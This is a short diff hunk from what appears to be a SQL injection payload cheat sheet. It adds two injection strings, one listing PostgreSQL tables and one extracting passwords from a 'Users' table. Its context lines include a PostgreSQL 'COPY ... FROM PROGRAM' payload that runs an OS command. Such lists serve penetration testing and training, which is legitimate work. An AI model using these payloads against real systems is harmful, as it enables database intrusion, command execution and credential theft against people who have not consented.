@@ -144,7 +144,8 @@ COPY exec FROM PROGRAM 'id';
 
 select * from exec;
 
-
+'';SELECT tablename  FROM pg_tables;
+''; (SELECT password FROM "Users") --
 
 # SQLITE (python jinja)
 
